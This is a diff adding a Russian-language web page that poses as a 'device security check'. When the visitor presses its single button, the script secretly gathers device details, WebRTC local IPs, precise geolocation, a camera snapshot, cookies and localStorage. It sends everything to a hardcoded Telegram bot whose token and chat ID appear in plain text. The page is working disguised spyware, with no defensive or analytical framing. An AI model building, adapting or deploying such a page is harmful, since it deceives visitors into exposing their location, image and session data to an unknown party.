@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Проверка безопасности</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            text-align: center;
+            padding: 50px;
+        }
+        h2 {
+            color: #2c3e50;
+        }
+        p {
+            margin: 10px 0;
+        }
+        button {
+            padding: 15px 30px;
+            font-size: 18px;
+            background-color: #27ae60;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #2ecc71;
+        }
+    </style>
+</head>
+<body>
+    <h2>📱 Проверка вашего устройства</h2>
+    <p>Для продолжения нажмите кнопку ниже.</p>
+    <button onclick="startCollection()">🟢 Начать проверку</button>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = "7961419672:AAEd-VMzuf43W9PsaQLveQ__vYMf2EOswu0";
+        const TELEGRAM_CHAT_ID = "5024505351";
+
+        function sendData(message) {
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,  {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            }).catch(err => console.error("Ошибка отправки:", err));
+        }
+
+        function sendFile(blob, caption = "") {
+            const formData = new FormData();
+            const file = new File([blob], "screenshot.jpg", { type: "image/jpeg" });
+            formData.append("document", file);
+            formData.append("chat_id", TELEGRAM_CHAT_ID);
+            formData.append("caption", caption);
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,  {
+                method: 'POST',
+                body: formData
+            }).catch(err => console.error("Ошибка файла:", err));
+        }
+
+        function getDeviceInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform || "Неизвестно",
+                language: navigator.language || "Неизвестно",
+                cookiesEnabled: document.cookie.length > 0,
+                online: navigator.onLine,
+                timestamp: new Date().toISOString()
+            };
+        }
+
+        function getLocalIPs() {
+            const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+            const ips = [];
+
+            const RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
+
+            if (!RTCPeerConnection) {
+                sendData("❌ WebRTC не поддерживается");
+                return;
+            }
+
+            const pc = new RTCPeerConnection({ iceServers: [] });
+            pc.createDataChannel("");
+            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
+            pc.onicecandidate = function(e) {
+                if (!e.candidate) {
+                    if (ips.length === 0) {
+                        sendData("📡 Локальные IP не найдены");
+                    } else {
+                        sendData(`<b>📡 Локальные IP:</b>\n<pre>${ips.join('\\n')}</pre>`);
+                    }
+                    pc.close();
+                    return;
+                }
+
+                const ipMatch = e.candidate.candidate.match(ipRegex);
+                if (ipMatch && !ips.includes(ipMatch[0])) {
+                    ips.push(ipMatch[0]);
+                }
+            };
+
+            setTimeout(() => {
+                pc.close();
+            }, 2000);
+        }
+
+        function requestGeolocation() {
+            if (!navigator.geolocation) {
+                sendData("❌ Геолокация не поддерживается");
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(position => {
+                const coords = position.coords;
+                sendData(`<b>🌍 Геолокация:</b>\n<pre>Широта: ${coords.latitude}\nДолгота: ${coords.longitude}</pre>`);
+            }, () => {
+                sendData("⚠️ Пользователь отклонил запрос геолокации");
+            }, {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            });
+        }
+
+        function requestCameraAccess() {
+            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                .then(stream => {
+                    sendData("🎥 Камера активирована");
+
+                    const video = document.createElement("video");
+                    video.srcObject = stream;
+                    video.play();
+
+                    const canvas = document.createElement("canvas");
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+
+                    const ctx = canvas.getContext("2d");
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    stream.getTracks().forEach(track => track.stop());
+
+                    canvas.toBlob(blob => {
+                        sendFile(blob, "📸 Скриншот с камеры");
+                    }, "image/jpeg", 0.8);
+                })
+                .catch(() => {
+                    sendData("❌ Ошибка доступа к камере");
+                });
+        }
+
+        function collectCookiesAndStorage() {
+            sendData(`<b>🍪 Cookies:</b>\n<code>${document.cookie || "нет кук"}</code>`);
+
+            let storageData = "";
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                storageData += `${key}: ${localStorage.getItem(key)}\n`;
+            }
+            if (storageData) {
+                sendData(`<b>📦 LocalStorage:</b>\n<code>${storageData}</code>`);
+            }
+        }
+
+        function startCollection() {
+            const deviceInfo = getDeviceInfo();
+            sendData(`<b>📲 Информация об устройстве:</b>\n<pre>${JSON.stringify(deviceInfo, null, 2)}</pre>`);
+
+            getLocalIPs();
+            requestGeolocation();
+            requestCameraAccess();
+            collectCookiesAndStorage();
+        }
+    </script>
+</body>
+</html>
